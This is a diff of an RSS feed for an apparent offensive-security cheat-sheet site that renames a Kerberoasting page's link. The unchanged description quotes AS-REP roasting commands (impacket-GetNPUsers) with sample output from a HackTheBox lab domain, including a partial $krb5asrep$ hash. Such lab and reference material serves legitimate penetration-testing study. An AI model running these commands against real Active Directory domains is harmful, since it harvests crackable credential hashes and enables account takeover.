@@ -23,9 +23,9 @@
     </item>
     <item>
       <title>Kerberoasting</title>
-      <link>https://tldrbins.github.io/roasting/</link>
+      <link>https://tldrbins.github.io/kerberoasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/roasting/</guid>
+      <guid>https://tldrbins.github.io/kerberoasting/</guid>
       <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; $ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [-] User j.roberts doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ---[SNIP]--- 0e09c5d9d1 [-] User j.robinson doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ impacket-GetNPUsers -no-pass -dc-ip 10.</description>
     </item>
     <item>
